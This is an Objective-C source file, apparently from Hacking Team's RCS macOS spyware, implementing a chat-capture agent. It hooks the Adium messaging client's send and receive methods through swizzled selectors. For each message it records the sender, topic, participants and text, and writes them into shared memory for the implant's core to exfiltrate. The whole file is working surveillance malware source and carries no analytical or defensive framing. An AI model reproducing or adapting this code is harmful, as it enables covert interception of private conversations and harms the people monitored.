//
//  RCSMAgentIMAdium.m
//  RCSMac
//
//  Created by Guido on 2/16/12.
//  Copyright 2012 HT srl. All rights reserved.
//

#import <objc/runtime.h>

#import "RCSMInputManager.h"
#import "RCSMAgentIMAdium.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"
 
void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSString *_message)
{
  NSData *processName         = [@"Adium" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *topic               = [_topic dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *peers               = [_peers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *content             = [_message dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData    = [[NSMutableData alloc] init];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  //
  if (sizeof(long) == 4) // 32bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }
  
  // Process Name
  [entryData appendData: processName];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Topic
  [entryData appendData: topic];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Peers
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Content
  [entryData appendData: [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendData: [@": " dataUsingEncoding: NSUTF16LittleEndianStringEncoding]]; 
  [entryData appendData: content];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
#ifdef DEBUG_IM_ADIUM
  infoLog(@"entryData: %@", entryData);
#endif
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_CHAT;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_IM_ADIUM
      verboseLog(@"message: %@", _message);
#endif
    }
  else
    {
#ifdef DEBUG_IM_ADIUM
      errorLog(@"Error while logging skype message to shared memory");
#endif
    }

  [logData release];
  [entryData release];
}

void adiumHookWrapper(id arg1, NSUInteger direction)
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([arg1 respondsToSelector: @selector(message)] &&
      [arg1 respondsToSelector: @selector(type)] &&
      [arg1 respondsToSelector: @selector(source)] &&
      [arg1 respondsToSelector: @selector(chat)])
    {

      NSString *topic;
      NSString *msgType = [arg1 performSelector: @selector(type)];
      NSUInteger msgLen = [[arg1 performSelector: @selector(message)] length];

      if (msgLen && [msgType isEqualToString: @"Message"] == YES)
        { 
          NSString *msgBuf  = [[arg1 performSelector: @selector(message)] string];
          NSString *src     = [[arg1 performSelector: @selector(source)] performSelector: @selector(displayName)];

          id chat   = [arg1 performSelector: @selector(chat)];
#ifdef DEBUG_IM_ADIUM
          infoLog(@"%@ message of type: %@, len: %d, supportsTopic: %d, isGroupChat: %d, msg:%@",
                direction==ADIUM_MSG_RECEIVE?@"Received":@"Sent",
                msgType,
                msgLen,
                [chat performSelector: @selector(supportsTopic)],
                [chat performSelector: @selector(isGroupChat)],
                msgBuf);
#endif
          // topic
          if ([chat performSelector: @selector(supportsTopic)] != 0)
            topic = [chat performSelector: @selector(topic)];
          else
            topic = @"-";

          // peers
          NSMutableString *activeMembers  = [[NSMutableString alloc] init];
          if ([chat performSelector: @selector(isGroupChat)] != 0)
            {
              for (NSString *alias in [chat performSelector: @selector(containedObjects)])
                {
                  [activeMembers appendString: [alias performSelector: @selector(ownDisplayName)]];
                  [activeMembers appendString: @", "];
                }
              [activeMembers replaceCharactersInRange: NSMakeRange([activeMembers length] - 2, 2)
                                           withString: @""];
            }
          else
            {
              [activeMembers appendString: src];
              [activeMembers appendString: @", "];
              [activeMembers appendString: 
                   [[arg1 performSelector: @selector(destination)] performSelector: @selector(displayName)]];
            }

          adiumlogMessage(src, topic, (NSString *)activeMembers, msgBuf);
          [activeMembers release];
        }
    }
  
  [outerPool release];
}

@implementation myAIContentController

- (void)myfinishReceiveContentObject: (id)arg1
{
  adiumHookWrapper(arg1, ADIUM_MSG_RECEIVE);
  [self myfinishReceiveContentObject: arg1];  
}

- (void)myfinishSendContentObject: (id)arg1
{
  adiumHookWrapper(arg1, ADIUM_MSG_SEND);
  [self myfinishSendContentObject: arg1];
}

@end
